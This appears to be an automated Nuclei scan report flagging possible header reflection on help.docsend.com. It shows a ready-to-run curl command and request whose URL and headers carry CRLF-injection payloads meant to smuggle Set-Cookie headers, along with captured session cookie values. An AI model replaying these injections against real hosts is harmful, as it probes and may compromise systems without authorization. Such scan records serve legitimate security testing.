### Looking for reflected values from request headers (header-reflection) found on https://help.docsend.com

----
**Details**: **header-reflection** matched at https://help.docsend.com

**Protocol**: HTTP

**Full URL**: https://help.docsend.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.help.docsend.com

**Timestamp**: Sat Dec 9 14:38:56 +0000 UTC 2023

**Template Information**

| Key | Value |
| --- | --- |
| Name | Looking for reflected values from request headers |
| Authors | panch0r3d |
| Tags |  |
| Severity | high |

**Request**
```http
GET /%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.help.docsend.com HTTP/1.1
Host: help.docsend.com
User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly
Connection: close
Accept: */*
Accept-Language: en
Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; _help_center_session=Q2ZpY3pKYUpiVEF6ZlJBNVJ1c3UxTWcxN25HYXgzcWVreDFuOFQ2ZEhuQ2dkSTVTK2lTYW1Kb3Y2YU9pcnRpdmVmSHpaQXR3cDAwSkZsaEk4WEZ2aXZGRFRTTG8zbm5QV3hXTkxUTHpia2xwMmR1dG5SaGEvSXdNQVArV1dUOWstLWFTM1J6UXNBdVhHbERIZE9yYjdNQUE9PQ%3D%3D--93255ab0eeffbfdd04d92c70f32009dfaf1ed6f6; __cfruid=e31f66552f2005d59c05a0e55bf68747d5bb8b6d-1702132731
Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly
X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly
x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 404 Not Found
Connection: close
Transfer-Encoding: chunked
Cache-Control: no-cache
Cache-Control: no-cache
Cf-Cache-Status: DYNAMIC
Cf-Ray: 832dfea06a2401ce-CDG
Content-Language: en-us
Content-Type: text/html; charset=utf-8
Date: Sat, 09 Dec 2023 14:38:56 GMT
Nel: {"success_fraction":0.01,"report_to":"cf-nel","max_age":604800}
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=ALjMPKOxu%2F5oXfd6oy5TvFJVyyyBIHS2kP4gGp4s2MXoalyT2eRGkPKPhCDXI63G94QOAk6Pc0T0r%2F%2Ft5thQ8OKMmVx8quhnNS6HnL1aRCq6qQMQf3TKIDEl3mHc9yKoO04%3D"}],"group":"cf-nel","max_age":604800}
Server: cloudflare
Set-Cookie: _zendesk_authenticated=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT; secure; HttpOnly; SameSite=None
Set-Cookie: _zendesk_session=ezEd1n9wceUcI4stTxVpFb3%2FURAt4WRCjv%2FiuBbYf%2Fl7hT1mWjDckebL9rmcdB87I6zmlWt4BDm6KiS9%2F7Y4LBtnd9gEUbwZPe7yzAKbytSG1pMklua8bJXAK9K2O%2B9m2K87kpVw4M20bvIiiDjCzUOujvJO%2FzEXAM2Z%2FZLszXIhhjngooN%2BjPOKm%2FLKMQSGo7%2Fc3cjGgOsldExR13qzMonREH5zIzTLOeHJ6k8OzuA%3D--J8AdwNymVUUw7PTb--VsRacynyswVlCfeStsvG0Q%3D%3D; path=/; secure; HttpOnly; SameSite=None
Set-Cookie: _help_center_session=S3AzVmx4UzY0aEo2RC9DenVwM09kNnZ5Q3dkdU5GZlBCcXQ4U3pFcHBmSGg2c0IxU0EwLy90WVh4aXJoYW94eFJkNXVIMmUrQnZZMlJyTnVtcjNRZXZJZHZmR3NKRUlZdnRpWjE3WWNTeCtlMTU4d2h6enBOQTFvUE5YUWNCRFZnWGRydFZlWXBpSUtlaWsvV0YvWVFMcGZONlM2ZVl3OUJpb1JtY0RZV0pBYmxlcnJSWmdXanh0aWpXUytOWDRBRXpHaEhrVmdqQlVrOGFqRXFrMkw5dz09LS1tdjI0N3FlT0tsdi9Fb2ttalI0VUlnPT0%3D--084fc87de6869e85a60c92ff8a2526683c47d143; path=/; secure; HttpOnly; SameSite=None
Strict-Transport-Security: max-age=31536000;
Vary: Accept
X-Frame-Options: SAMEORIGIN
X-Request-Id: 1234560d0ASet-CookieCanaryCookie12345XRpathsecurehttponly
X-Runtime: 0.098540
X-Ua-Compatible: IE=edge
X-Xss-Protection: 1; mode=block
X-Zendesk-Origin-Server: app-server-7f4df568f6-p4sl5
X-Zendesk-Processed-Host-Header: help.docsend.com

<!DOCTYPE html>
<html dir="ltr" lang="en-US">
<head>
  <meta charset="utf-8" />
  <!-- v23896 -->


  <title>The page you were looking for doesn't exist &ndash; DocSend Help Center</title>

  <meta name="csrf-param" content="authenticity_token">
<meta name="csrf-token" content="hc:meta:server:1v45O-mMw1K5jhM29VBQrOAKPsAH0p_nosajMIxKl7vmZSvoGRyKZ6HQwSf9nh5B-HMSU-1soxYf8C9SDMi5Yw">

  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">

  <link rel="stylesheet" href="//static.zdassets.com/hc/assets/application-1dcff57f34179d82a4935f28e3666e12.css" media="all" id="stylesheet" />
    <!-- Entypo pictograms by Daniel Bruce — www.entypo.com -->
    <link rel="stylesheet" href="//static.zdassets.com/hc/assets/theming_v1_support-e05586b61178dcde2a13a3d323525a18.css" media="all" />
  <link rel="stylesheet" type="text/css" href="//p27.zdassets.com/hc/theming_assets/717303/220138/style.css?digest=6165121109019">

  <link rel="icon" type="image/x-icon" href="//theme.zdassets.com/theme_assets/717303/38456c263f9a2bc8d4a1d306d76b8d79782de8fc.png" />

    <script src="//static.zdassets.com/hc/assets/jquery-09d07e20ce042ef10e301661ad1f316c.js"></script>
    
    

  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />

<!-- START Google Search Console verification  -->
<meta name="google-site-verification" content="ROBLhD0y6o3LsNzlQpMwwS-LD6CZEQKSHDdVL9UTbG0" />
<!-- END Google Search Console verification  -->

<!-- START OpenGraph -->
<meta property="og:title" content="DocSend Help Center" />
<meta property="og:url" content="https://help.docsend.com/" />
<meta property="og:description" content="Learn how to use DocSend to organize, track, and control your content." />
<meta property="og:type" content="article" />
<meta property="og:image" content="//theme.zdassets.com/theme_assets/717303/629aaccdd17097061f00d798bd37692403d5b4a7.jpg" />
<meta property="og:image:type" content="image/jpeg" />
<meta property="og:image:width" content="1200" />
<meta property="og:image:height" content="630" />
<meta property="og:image:alt" content="DocSend Help Center" />
<!-- END OpenGraph  -->

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js"></script>

  <script type="text/javascript" src="//p27.zdassets.com/hc/theming_assets/717303/220138/script.js?digest=6165121109019"></script>
</head>
<body class="">
  
  

  <header class="header">
  <div class="logo">
    <a title="Home" href="/hc">
      <img src="//theme.zdassets.com/theme_assets/717303/5f6f74d12795770f3afbadd2bb27c2848fef3314.png" alt="Logo">
    </a>
  </div>
  <div class="nav-wrapper">
    <span class="icon-menu"></span>
    <nav class="user-nav" id="user-nav">
      <a href='https://docsend.com'>DocSend</a>
      
      <a class="submit-a-request" href="/hc/requests/new">Submit a request</a>
    </nav>
  </div>
</header>


  <main role="main">
    <div class="container-divider"></div>
<div class="error-page">
  <h1>oops</h1>

  

  

  
    <h2>The page you were looking for doesn't exist</h2>
  .... Truncated ....
```

**Extra Information**

**Extracted results:**

- X-Request-Id: 1234560d0ASet-CookieCanaryCookie12345XRpathsecurehttponly



**CURL command**
```sh
curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: Canary12345=qwerty%0d%0ASet-Cookie: CanaryCookie=12345CK; path=/; secure; httponly; _help_center_session=Q2ZpY3pKYUpiVEF6ZlJBNVJ1c3UxTWcxN25HYXgzcWVreDFuOFQ2ZEhuQ2dkSTVTK2lTYW1Kb3Y2YU9pcnRpdmVmSHpaQXR3cDAwSkZsaEk4WEZ2aXZGRFRTTG8zbm5QV3hXTkxUTHpia2xwMmR1dG5SaGEvSXdNQVArV1dUOWstLWFTM1J6UXNBdVhHbERIZE9yYjdNQUE9PQ%3D%3D--93255ab0eeffbfdd04d92c70f32009dfaf1ed6f6; __cfruid=e31f66552f2005d59c05a0e55bf68747d5bb8b6d-1702132731' -H 'Origin: Canary123456.com%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' -H 'Referer: google.com%0d%0ASet-Cookie: CanaryCookie=12345R; path=/; secure; httponly' -H 'User-Agent: Mozilla Canary12345%0d%0ASet-Cookie: CanaryCookie=12345UA; path=/; secure; httponly' -H 'X-Forwarded-For: 0.0.0.0%0d%0ASet-Cookie: CanaryCookie=12345XF; path=/; secure; httponly' -H 'x-request-id: 123456%0d%0ASet-Cookie: CanaryCookie=12345XR; path=/; secure; httponly' 'https://help.docsend.com/%0d%0aset-cookie%20%3amycookie%3dCanary12345;%20%44omain%20%3d.help.docsend.com'
```

----

Generated by [Nuclei v3.1.0-dev](https://github.com/projectdiscovery/nuclei)